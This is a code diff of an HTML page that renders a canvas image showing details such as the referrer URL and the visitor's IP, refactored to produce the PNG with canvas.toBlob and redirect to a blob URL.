@@ -5,12 +5,11 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Dynamic Time Image</title>
   <script>
-    // Immediately generate the image once the page is accessed
     window.onload = async function() {
       const canvas = document.createElement("canvas");
       const ctx = canvas.getContext("2d");
       canvas.width = 800;
-      canvas.height = 600; // Increased height for more text lines
+      canvas.height = 600;
 
       // Background
       ctx.fillStyle = "black";
@@ -38,32 +37,15 @@
       // Write referrer URL
       ctx.fillText(`Referrer: ${referrer}`, canvas.width / 2, (canvas.height / 5) * 3);
 
-      // Convert canvas to Base64
-      const base64Image = canvas.toDataURL("image/png");
+      // Convert canvas to Blob
+      canvas.toBlob(function(blob) {
+        // Create a Blob URL from the Blob
+        const blobURL = URL.createObjectURL(blob);
 
-      // Serve the image data directly
-      serveImage(base64Image);
+        // Redirect to the Blob URL to treat it as an image
+        window.location.href = blobURL;
+      }, "image/png"); // Specify PNG type
     };
-
-    // Serve the generated image
-    function serveImage(base64Image) {
-      const base64Data = base64Image.split(",")[1]; // Extract only the Base64 part
-
-      // Convert Base64 to binary data
-      const binaryData = atob(base64Data);
-      const length = binaryData.length;
-      const arrayBuffer = new Uint8Array(length);
-      for (let i = 0; i < length; i++) {
-        arrayBuffer[i] = binaryData.charCodeAt(i);
-      }
-
-      // Create a Blob and serve it as the image response
-      const blob = new Blob([arrayBuffer], { type: "image/png" });
-      const blobURL = URL.createObjectURL(blob);
-
-      // Replace the page content with the image
-      window.location.replace(blobURL);
-    }
 
     // Fetch IP address using a public API
     async function fetchIP() {
@@ -79,5 +61,7 @@
   </script>
 </head>
 <body>
+  <h1>Generating Image...</h1>
+  <p>Please wait while the image is being generated.</p>
 </body>
 </html>
